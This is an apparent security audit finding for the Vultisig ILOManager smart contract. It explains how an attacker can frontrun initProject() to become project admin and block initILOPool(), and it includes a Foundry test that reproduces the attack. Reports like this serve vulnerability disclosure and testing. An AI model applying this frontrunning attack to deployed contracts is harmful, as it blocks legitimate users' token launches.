# Vulnerability details

## Vulnerability Detail
An attacker can frontrun an honest user's call to `initProject()` by calling `initProject()` with the exact same parameters.

The resulting state will be the exact same EXCEPT the admin of the project will be the attacker [(here is proof)](https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOManager.sol#L138)

At this point the attacker can DOS the important `initILOPool()` by simply never calling the function. No other user can call `initILOPool()` because it has the `onlyProjectAdmin` modifier. [(here is the proof)](https://github.com/code-423n4/2024-06-vultisig/blob/cb72b1e9053c02a58d874ff376359a83dc3f0742/src/ILOManager.sol#L51-L54)

**Important Note:** The constructor of `ILOManager` transfers ownership to tx.origin. This is significant because the owner is now an EOA therefore it is NOT possible to atomically call `initialize()` and then `initProject()` to mitigate the issue.


## Impact
Attacker can DOS the important `initILOPool()` function by frontrunning it


## Proof of Concept
Add the code to `POC1.t.sol`

Run `test__frontrunInitProject` using the following command
```bash
forge test --mt test__frontrunInitProject
```

```solidity
// SPDX-License-Identifier: MIT 

pragma solidity =0.7.6;
pragma abicoder v2;

import "./IntegrationTestBase.sol"; 

contract POC1 is IntegrationTestBase {
    // setup users
    address public attacker = 0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38;
    address public honestUser = 0xEf57e88a27f8958D72fd9F983D28349374e6C110;

    function setUp() external {
        _setupBase();
    }

    function test__frontrunInitProject() external {
        // An honest user sends a Tx calling initProject()

        // An attacker sees the honest user's Tx in the mempool and frontruns it 
        // with the exact same parameters
        vm.prank(attacker);
        iloManager.initProject(IILOManager.InitProjectParams({
                    saleToken: mockProject().saleToken,
                    raiseToken: mockProject().raiseToken,
                    fee: 10000,
                    initialPoolPriceX96: mockProject().initialPoolPriceX96+1, 
                    launchTime: mockProject().launchTime
                })
            );
        
        // At this point the projectAdmin is the attacker, so only they can call initILOPool

        // When any other user tries to call initILOPool it will revert
        vm.prank(honestUser);
        IILOManager.InitPoolParams memory params = _getInitPoolParams();
        vm.expectRevert(bytes("UA"));
        iloManager.initILOPool(params);
    }
}
```
